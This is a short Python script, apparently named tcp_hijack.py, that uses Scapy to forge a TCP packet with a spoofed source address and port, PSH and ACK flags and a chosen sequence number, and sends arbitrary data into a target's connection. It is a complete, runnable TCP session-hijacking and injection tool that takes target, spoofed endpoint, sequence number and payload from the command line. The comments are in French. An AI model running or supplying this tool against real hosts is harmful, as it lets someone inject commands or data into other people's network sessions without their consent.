from scapy.all import IP, TCP, send

def inject_tcp_data(target_ip, target_port, spoofed_ip, spoofed_port, seq_num, data):
    # Créez le paquet IP avec l'adresse IP usurpée
    ip_layer = IP(src=spoofed_ip, dst=target_ip)

    # Créez le paquet TCP avec le flag PSH
    tcp_layer = TCP(
        sport=spoofed_port,  # Port source (usurpé)
        dport=target_port,   # Port destination
        flags="PA",          # Flags PSH et ACK
        seq=seq_num          # Numéro de séquence attendu par la cible
    )

    # Combinez les couches IP, TCP et les données
    packet = ip_layer / tcp_layer / data

    print(f"Sending TCP packet with injected data: {packet.summary()}")
    
    # Envoyez le paquet
    send(packet, verbose=False)

if __name__ == "__main__":
    import sys

    if len(sys.argv) != 7:
        print("Usage: python tcp_hijack.py <target_ip> <target_port> <spoofed_ip> <spoofed_port> <seq_num> <data>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    spoofed_ip = sys.argv[3]
    spoofed_port = int(sys.argv[4])
    seq_num = int(sys.argv[5])
    data = sys.argv[6]

    inject_tcp_data(target_ip, target_port, spoofed_ip, spoofed_port, seq_num, data)
